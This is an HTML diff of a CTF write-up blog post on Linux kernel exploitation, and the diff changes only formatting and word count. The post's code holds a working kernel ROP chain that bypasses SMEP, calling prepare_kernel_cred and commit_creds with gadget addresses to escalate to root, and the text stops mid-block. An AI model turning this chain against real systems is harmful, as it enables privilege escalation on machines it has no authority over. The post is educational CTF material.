@@ -9,8 +9,8 @@
 <meta property="og:description" content="The second part of the series about learning Linux kernel exploitation through hxpCTF2020 kernel-rop: Adding SMEP, KPTI and SMAP" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/" /><meta property="og:image" content="https://lkmidas.github.io/images/avatar.png"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-01-28T16:04:24&#43;07:00" />
-<meta property="article:modified_time" content="2021-01-28T16:04:24&#43;07:00" />
+<meta property="article:published_time" content="2021-01-28T16:04:24+07:00" />
+<meta property="article:modified_time" content="2021-01-28T16:04:24+07:00" />
 
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://lkmidas.github.io/images/avatar.png"/>
@@ -29,7 +29,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/lkmidas.github.io\/posts\/20210128-linux-kernel-pwn-part-2\/"
-        },"genre": "posts","wordcount":  3671 ,
+        },"genre": "posts","wordcount":  3747 ,
         "url": "https:\/\/lkmidas.github.io\/posts\/20210128-linux-kernel-pwn-part-2\/","datePublished": "2021-01-28T16:04:24+07:00","dateModified": "2021-01-28T16:04:24+07:00","publisher": {
             "@type": "Organization",
             "name": "Midas"},"author": {
@@ -93,7 +93,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">Learning Linux Kernel Exploitation - Part 2</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Midas</a></span>&nbsp;<span class="post-category">included in <a href="/categories/pwning/"><i class="far fa-folder fa-fw"></i>pwning</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-01-28">2021-01-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3671 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-01-28">2021-01-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3747 words&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;18 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
@@ -159,9 +159,9 @@
 <h3 id="the-attempt-to-overwrite-cr4">The attempt to overwrite CR4</h3>
 <p>As I have mentioned above, in the kernel, the 20th bit of Control Register <code>CR4</code> is responsible for enabling or disabling <code>SMEP</code>. And actually, while executing in <code>kernel-mode</code>, we have the power to modify the content of this register with asm instructions such as <code>mov cr4, rdi</code>. Instruction such as that comes from a function called <code>native_write_cr4()</code>, which overwrites the content of <code>CR4</code> with its parameter, and it resides in the kernel itself. So my first attempt to bypass <code>SMEP</code> is to ROP into <code>native_write_cr4(value)</code>, where <code>value</code> is set to clear the 20th bit of <code>CR4</code>.</p>
 <p>The same as <code>commit_creds()</code> and <code>prepare_kernel_cred()</code>, we can find the address of that function by reading <code>/proc/kallsyms</code>:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">cat /proc/kallsyms <span class="p">|</span> grep native_write_cr4
--&gt; ffffffff814443e0 T native_write_cr4
-</code></pre></div><div class="details admonition note open">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /proc/kallsyms <span class="p">|</span> grep native_write_cr4
+</span></span><span class="line"><span class="cl">-&gt; ffffffff814443e0 T native_write_cr4
+</span></span></code></pre></div><div class="details admonition note open">
         <div class="details-summary admonition-title">
             <i class="icon fas fa-pencil-alt fa-fw"></i>Important Note<i class="details-icon fas fa-angle-right fa-fw"></i>
         </div>
@@ -170,30 +170,30 @@
         </div>
     </div>
 <p>The way we build a ROP chain in the kernel is exactly the same as in userland. So here, instead of immediately return into our userland code, we will return into <code>native_write_cr4(value)</code>, then return to our privileges escalation code. For the current value of <code>CR4</code>, we can get it by either causing a kernel panic and it will be dumped out (or attaching a debugger to the kernel)</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>    3.794861<span class="o">]</span> CR2: 0000000000401fd9 CR3: 000000000657c000 CR4: 00000000001006f0
-</code></pre></div><p>We will clear the 20th bit, which is at the position of <code>0x100000</code>, our <code>value</code> will be <code>0x6f0</code>. Our payload will be as follow:</p>
-<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81006370</span><span class="p">;</span>
-<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">native_write_cr4</span> <span class="o">=</span> <span class="mh">0xffffffff814443e0</span><span class="p">;</span>
-
-<span class="kt">void</span> <span class="nf">overflow</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
-    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
-    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi_ret</span><span class="p">;</span> <span class="c1">// return address
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6f0</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">native_write_cr4</span><span class="p">;</span> <span class="c1">// native_write_cr4(0x6f0), effectively clear the 20th bit
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">escalate_privs</span><span class="p">;</span>
-
-    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload&#34;</span><span class="p">);</span>
-    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
-
-    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div><p>For gadgets such as <code>pop rdi ; ret</code>, we can easily find them by grepping the <code>gadgets.txt</code> file that was generated by running <code>ROPgadget</code> on the kernel image in the first post.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>    3.794861<span class="o">]</span> CR2: 0000000000401fd9 CR3: 000000000657c000 CR4: 00000000001006f0
+</span></span></code></pre></div><p>We will clear the 20th bit, which is at the position of <code>0x100000</code>, our <code>value</code> will be <code>0x6f0</code>. Our payload will be as follow:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81006370</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">native_write_cr4</span> <span class="o">=</span> <span class="mh">0xffffffff814443e0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">overflow</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi_ret</span><span class="p">;</span> <span class="c1">// return address
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6f0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">native_write_cr4</span><span class="p">;</span> <span class="c1">// native_write_cr4(0x6f0), effectively clear the 20th bit
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">escalate_privs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>For gadgets such as <code>pop rdi ; ret</code>, we can easily find them by grepping the <code>gadgets.txt</code> file that was generated by running <code>ROPgadget</code> on the kernel image in the first post.</p>
 <div class="details admonition warning open">
         <div class="details-summary admonition-title">
             <i class="icon fas fa-exclamation-triangle fa-fw"></i>Warning<i class="details-icon fas fa-angle-right fa-fw"></i>
@@ -203,29 +203,29 @@
         </div>
     </div>
 <p>In theory, running this should give us a root shell. However, in reality, the kernel still crashes, and even more confusing, the reason for the crash is <code>SMEP</code>:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>    3.770954<span class="o">]</span> unable to execute userspace code <span class="o">(</span>SMEP?<span class="o">)</span> <span class="o">(</span>uid: 1000<span class="o">)</span>
-</code></pre></div><p>Why is <code>SMEP</code> still active if we have already cleared the 20th bit? I decided to use <code>dmesg</code> to find out if there is anything weird happens to <code>CR4</code>, and I found this line:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>    3.767510<span class="o">]</span> pinned CR4 bits changed: 0x100000!?
-</code></pre></div><p>It seems like the 20th bit of <code>CR4</code> is somehow pinned. I then proceeded to google for the source code of <code>native_write_cr4()</code> and other resources to clarify the situation, here is the source code:</p>
-<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">native_write_cr4</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">val</span><span class="p">)</span>
-<span class="p">{</span>
-	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">bits_changed</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-
-<span class="nl">set_register</span><span class="p">:</span>
-	<span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span><span class="s">&#34;mov %0,%%cr4&#34;</span><span class="o">:</span> <span class="s">&#34;+r&#34;</span> <span class="p">(</span><span class="n">val</span><span class="p">)</span> <span class="o">:</span> <span class="o">:</span> <span class="s">&#34;memory&#34;</span><span class="p">);</span>
-
-	<span class="k">if</span> <span class="p">(</span><span class="n">static_branch_likely</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cr_pinning</span><span class="p">))</span> <span class="p">{</span>
-		<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">((</span><span class="n">val</span> <span class="o">&amp;</span> <span class="n">cr4_pinned_mask</span><span class="p">)</span> <span class="o">!=</span> <span class="n">cr4_pinned_bits</span><span class="p">))</span> <span class="p">{</span>
-			<span class="n">bits_changed</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&amp;</span> <span class="n">cr4_pinned_mask</span><span class="p">)</span> <span class="o">^</span> <span class="n">cr4_pinned_bits</span><span class="p">;</span>
-			<span class="n">val</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">cr4_pinned_mask</span><span class="p">)</span> <span class="o">|</span> <span class="n">cr4_pinned_bits</span><span class="p">;</span>
-			<span class="k">goto</span> <span class="n">set_register</span><span class="p">;</span>
-		<span class="p">}</span>
-		<span class="cm">/* Warn after we&#39;ve corrected the changed bits. */</span>
-		<span class="n">WARN_ONCE</span><span class="p">(</span><span class="n">bits_changed</span><span class="p">,</span> <span class="s">&#34;pinned CR4 bits changed: 0x%lx!?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
-			  <span class="n">bits_changed</span><span class="p">);</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div><p>And there is also <a href="https://patchwork.kernel.org/project/kernel-hardening/patch/20190220180934.GA46255@beast/" target="_blank" rel="noopener noreffer">a documentation on CR4 bits pinning</a>. Reading the mentioned resources, it is clear that in newer kernel versions, the 20th and 21st bits of <code>CR4</code> are pinned on boot, and will immediately be set again after being cleared, so <em><strong>they can never be overwritten this way anymore!</strong></em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>    3.770954<span class="o">]</span> unable to execute userspace code <span class="o">(</span>SMEP?<span class="o">)</span> <span class="o">(</span>uid: 1000<span class="o">)</span>
+</span></span></code></pre></div><p>Why is <code>SMEP</code> still active if we have already cleared the 20th bit? I decided to use <code>dmesg</code> to find out if there is anything weird happens to <code>CR4</code>, and I found this line:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>    3.767510<span class="o">]</span> pinned CR4 bits changed: 0x100000!?
+</span></span></code></pre></div><p>It seems like the 20th bit of <code>CR4</code> is somehow pinned. I then proceeded to google for the source code of <code>native_write_cr4()</code> and other resources to clarify the situation, here is the source code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">native_write_cr4</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">val</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">bits_changed</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">set_register</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span><span class="s">&#34;mov %0,%%cr4&#34;</span><span class="o">:</span> <span class="s">&#34;+r&#34;</span> <span class="p">(</span><span class="n">val</span><span class="p">)</span> <span class="o">:</span> <span class="o">:</span> <span class="s">&#34;memory&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">static_branch_likely</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cr_pinning</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">((</span><span class="n">val</span> <span class="o">&amp;</span> <span class="n">cr4_pinned_mask</span><span class="p">)</span> <span class="o">!=</span> <span class="n">cr4_pinned_bits</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="n">bits_changed</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&amp;</span> <span class="n">cr4_pinned_mask</span><span class="p">)</span> <span class="o">^</span> <span class="n">cr4_pinned_bits</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="n">val</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">cr4_pinned_mask</span><span class="p">)</span> <span class="o">|</span> <span class="n">cr4_pinned_bits</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">goto</span> <span class="n">set_register</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="cm">/* Warn after we&#39;ve corrected the changed bits. */</span>
+</span></span><span class="line"><span class="cl">		<span class="n">WARN_ONCE</span><span class="p">(</span><span class="n">bits_changed</span><span class="p">,</span> <span class="s">&#34;pinned CR4 bits changed: 0x%lx!?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			  <span class="n">bits_changed</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>And there is also <a href="https://patchwork.kernel.org/project/kernel-hardening/patch/20190220180934.GA46255@beast/" target="_blank" rel="noopener noreffer">a documentation on CR4 bits pinning</a>. Reading the mentioned resources, it is clear that in newer kernel versions, the 20th and 21st bits of <code>CR4</code> are pinned on boot, and will immediately be set again after being cleared, so <em><strong>they can never be overwritten this way anymore!</strong></em></p>
 <p>So my first attempt was a fail. At least we now know that even though we have the power to overwrite <code>CR4</code> in <code>kernel-mode</code>, the kernel developers have already awared of it and prohibited us from using such thing to exploit the kernel. Let&rsquo;s move on to develop a stronger exploitation that will actually work.</p>
 <h3 id="building-a-complete-escalation-rop-chain">Building a complete escalation ROP chain</h3>
 <p>In this second attempt, we will get rid of the idea of getting root privileges by running our own code completely, and try to achieve it by using ROP only. The plan is straightforward:</p>
@@ -236,85 +236,93 @@
 <li>ROP into <code>iretq</code> with the stack setup as <code>RIP|CS|RFLAGS|SP|SS</code>.</li>
 </ol>
 <p>The ROP chain itself is not complicated at all, but there are still some hiccups in building it. Firstly, as I mentioned above, there are a lot of gadgets that <code>ROPgadget</code> found but are unusable. Therefore, I had to do a lot of trials-and-errors and finally ended up using these gadgets to move the return value in step 1 (stored in <code>rax</code>) into <code>rdi</code> to pass to <code>commit_creds()</code>, they might seem a bit bizarre, but all of the ordinary gadgets that I tried are non-executable:</p>
-<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81007616</span><span class="p">;</span> <span class="c1">// pop rdx ; ret
-</span><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cmp_rdx_jne_pop2_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81964cc4</span><span class="p">;</span> <span class="c1">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
-</span><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mov_rdi_rax_jne_pop2_ret</span> <span class="o">=</span> <span class="mh">0xffffffff8166fea3</span><span class="p">;</span> <span class="c1">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
-</span></code></pre></div><p>The goal with these 3 gadgets is to move <code>rax</code> into <code>rdi</code> without taking the <code>jne</code>. So I have to pop the value 8 into <code>rdx</code>, then return to a <code>cmp</code> instruction to make the comparison equals, which will make sure that we won&rsquo;t jump to <code>jne</code> branch:</p>
-<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="p">...</span>
-<span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdx_ret</span><span class="p">;</span>
-<span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x8</span><span class="p">;</span> <span class="c1">// rdx &lt;- 8
-</span><span class="c1"></span><span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cmp_rdx_jne_pop2_ret</span><span class="p">;</span> <span class="c1">// make sure JNE doesn&#39;t branch
-</span><span class="c1"></span><span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbx
-</span><span class="c1"></span><span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
-</span><span class="c1"></span><span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rdi_rax_jne_pop2_ret</span><span class="p">;</span> <span class="c1">// rdi &lt;- rax
-</span><span class="c1"></span><span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbx
-</span><span class="c1"></span><span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
-</span><span class="c1"></span><span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span> <span class="c1">// commit_creds(prepare_kernel_cred(0))
-</span><span class="c1"></span><span class="p">...</span>
-</code></pre></div><p>Secondly, it seems that <code>ROPgadget</code> can find <code>swapgs</code> just fine, but it can&rsquo;t find <code>iretq</code>, so I have to use <code>objdump</code> to look for it:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">objdump -j .text -d ~/vmlinux <span class="p">|</span> grep iretq <span class="p">|</span> head -1
--&gt; ffffffff8100c0d9:       <span class="m">48</span> cf                   iretq  
-</code></pre></div><p>With the gadgets in hand, we can build the full ROP chain:</p>
-<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_shell</span><span class="p">;</span>
-
-<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81006370</span><span class="p">;</span>
-<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81007616</span><span class="p">;</span> <span class="c1">// pop rdx ; ret
-</span><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cmp_rdx_jne_pop2_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81964cc4</span><span class="p">;</span> <span class="c1">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
-</span><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mov_rdi_rax_jne_pop2_ret</span> <span class="o">=</span> <span class="mh">0xffffffff8166fea3</span><span class="p">;</span> <span class="c1">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
-</span><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="mh">0xffffffff814c6410</span><span class="p">;</span>
-<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="mh">0xffffffff814c67f0</span><span class="p">;</span>
-<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">swapgs_pop1_ret</span> <span class="o">=</span> <span class="mh">0xffffffff8100a55f</span><span class="p">;</span> <span class="c1">// swapgs ; pop rbp ; ret
-</span><span class="c1"></span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">iretq</span> <span class="o">=</span> <span class="mh">0xffffffff8100c0d9</span><span class="p">;</span>
-
-<span class="kt">void</span> <span class="nf">overflow</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
-    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
-    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi_ret</span><span class="p">;</span> <span class="c1">// return address
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rdi &lt;- 0
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span> <span class="c1">// prepare_kernel_cred(0)
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdx_ret</span><span class="p">;</span>
-    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x8</span><span class="p">;</span> <span class="c1">// rdx &lt;- 8
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cmp_rdx_jne_pop2_ret</span><span class="p">;</span> <span class="c1">// make sure JNE doesn&#39;t branch
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbx
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// dummy rbp
